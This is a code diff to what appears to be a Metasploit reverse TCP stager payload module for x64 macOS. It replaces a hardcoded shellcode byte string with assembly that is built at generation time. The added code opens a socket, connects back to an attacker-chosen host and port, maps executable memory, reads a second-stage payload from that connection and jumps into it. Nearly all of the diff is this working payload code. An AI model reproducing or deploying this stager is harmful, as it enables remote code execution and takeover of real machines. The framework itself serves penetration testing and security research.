@@ -21,35 +21,69 @@ module MetasploitModule
       'Arch'        => ARCH_X64,
       'Handler'     => Msf::Handler::ReverseTcp,
       'Convention'  => 'sockedi',
-      'Stager'      =>
-      {
-        'Offsets' =>
-        {
-          'LHOST' => [ 37, 'ADDR'],
-          'LPORT' => [ 35, 'n']
-        },
-        'Payload' =>
-          "\xb8\x61\x00\x00\x02\x6a\x02\x5f\x6a\x01\x5e\x48" +
-          "\x31\xd2\x0f\x05\x49\x89\xc5\x48\x89\xc7\xb8\x62" +
-          "\x00\x00\x02\x48\x31\xf6\x56\x48\xbe\x00\x02\x15" +
-          "\xb3\x7f\x00\x00\x01\x56\x48\x89\xe6\x6a\x10\x5a" +
-          "\x0f\x05\x4c\x89\xef\xb8\x1d\x00\x00\x02\x48\x31" +
-          "\xc9\x51\x48\x89\xe6\xba\x04\x00\x00\x00\x4d\x31" +
-          "\xc0\x4d\x31\xd2\x0f\x05\x41\x5b\x4c\x89\xde\x81" +
-          "\xe6\x00\xf0\xff\xff\x81\xc6\x00\x10\x00\x00\xb8" +
-          "\xc5\x00\x00\x02\x48\x31\xff\x48\xff\xcf\xba\x07" +
-          "\x00\x00\x00\x41\xba\x02\x10\x00\x00\x49\x89\xf8" +
-          "\x4d\x31\xc9\x0f\x05\x48\x89\xc6\x56\x4c\x89\xef" +
-          "\x48\x31\xc9\x4c\x89\xda\x4d\x31\xc0\x4d\x31\xd2" +
-          "\xb8\x1d\x00\x00\x02\x0f\x05\x58\xff\xd0"
-      }
     ))
   end
 
-  def handle_intermediate_stage(conn, p)
-    #
-    # Our stager payload expects to see a next-stage length first.
-    #
-    conn.put([p.length].pack('V'))
+  def generate(opts = {})
+    encoded_port = "%.8x" % [datastore['LPORT'].to_i,2].pack("vv").unpack("N").first
+    encoded_host = "%.8x" % Rex::Socket.addr_aton(datastore['LHOST']||"127.127.127.127").unpack("V").first
+    stager_asm = %(
+    mov     rcx, ~0x#{encoded_host}#{encoded_port}
+    not     rcx
+    push    rcx
+    xor     ebp, ebp
+    bts     ebp, 25
+
+    ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
+    push    rbp
+    pop     rax
+    cdq                      ; rdx=IPPROTO_IP
+    push    1
+    pop     rsi              ; rsi=SOCK_STREAM
+    push    2
+    pop     rdi              ; rdi=AF_INET
+    mov     al, 97
+    syscall
+
+    mov     r13, rax
+    xchg    eax, edi         ; edi=s
+    xchg    eax, esi         ; esi=2
+
+    ; connect (sockfd, {AF_INET,4444,127.0.0.1}, 16);
+    push    rbp
+    pop     rax
+    push    rsp
+    pop     rsi
+    mov     dl, 16           ; rdx=sizeof(sa)
+    mov     al, 98           ; rax=sys_connect
+    syscall
+
+    ; mmap(0x0, 0x1000, 0x7, 0x1002, 0x0, 0x0)
+    pop r11
+    mov rsi, r11
+    xor rdi, rdi
+    mov rsi, 0x1000
+    mov eax, 0x20000c5
+    mov edx, 7
+    mov r10, 0x1002
+    xor r8, r8
+    xor r9, r9
+    syscall
+
+    ; recvfrom(0x3, addr, 0x1000)
+    mov rsi, rax
+    push rsi
+    mov rdi, r13
+    xor rcx, rcx
+    mov rdx, 0x1000
+    xor r10, r10
+    xor r8, r8
+    mov eax, 0x200001d
+    syscall
+    pop rax
+    call rax
+    )
+
+    Metasm::Shellcode.assemble(Metasm::X64.new, stager_asm).encode_string
   end
 end
